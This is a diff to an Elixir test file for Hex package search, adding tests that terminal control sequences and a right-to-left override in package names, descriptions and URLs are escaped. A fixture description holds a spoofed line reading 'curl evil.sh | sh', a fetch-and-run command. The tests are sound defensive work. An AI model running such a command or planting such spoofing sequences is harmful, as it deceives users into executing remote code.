@@ -307,6 +307,40 @@ defmodule Mix.Tasks.Hex.PackageTest do
       end)
     end
 
+    test "escapes terminal control sequences in search results" do
+      bypass = Bypass.open()
+      Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+      body = [
+        %{
+          "name" => "evil",
+          "meta" => %{"description" => "Docs\e[2K\rActually run: curl evil.sh | sh"},
+          "releases" => [%{"version" => "1.0.0"}],
+          "html_url" => "https://example.com/\e[2Kforged"
+        }
+      ]
+
+      Bypass.expect(bypass, "GET", "/api/packages", fn conn ->
+        conn
+        |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+        |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(body))
+      end)
+
+      Mix.Tasks.Hex.Package.run(["search", "evil"])
+
+      assert_received {:mix_shell, :info, [header]}
+      assert header =~ "Description"
+
+      assert_received {:mix_shell, :info, [row]}
+
+      assert row =~ "Docs\\e[2K\\rActually run: curl evil.sh | sh"
+      # The URL drops the control bytes rather than showing them.
+      assert row =~ "https://example.com/[2Kforged"
+
+      refute row =~ "\e[2K"
+      refute row =~ "\r"
+    end
+
     test "org packages" do
       in_tmp(fn ->
         set_home_tmp()
@@ -319,6 +353,36 @@ defmodule Mix.Tasks.Hex.PackageTest do
         refute_received {:mix_shell, :info, ["ex_doc" <> _]}
         refute_received {:mix_shell, :info, ["only_doc" <> _]}
       end)
+    end
+  end
+
+  test "escapes package names in search results with and without organizations" do
+    for repository <- ["hexpm", "private"] do
+      bypass = Bypass.open()
+      Hex.State.put(:api_url, "http://localhost:#{bypass.port}/api")
+
+      body = [
+        %{
+          "repository" => repository,
+          "name" => "evil\e[2K\rFORGED\u{202E}",
+          "meta" => %{"description" => "description"},
+          "releases" => [%{"version" => "1.0.0"}],
+          "html_url" => "https://example.com"
+        }
+      ]
+
+      Bypass.expect(bypass, "GET", "/api/packages", fn conn ->
+        conn
+        |> Plug.Conn.put_resp_header("content-type", "application/vnd.hex+erlang")
+        |> Plug.Conn.resp(200, Hex.Utils.safe_serialize_erlang(body))
+      end)
+
+      Mix.Tasks.Hex.Package.run(["search", "evil"])
+      output = Case.shell_output()
+      assert output =~ "evil\\e[2K\\rFORGED\\u{202E}"
+      refute output =~ "\e"
+      refute output =~ "\r"
+      refute output =~ "\u{202E}"
     end
   end
 end
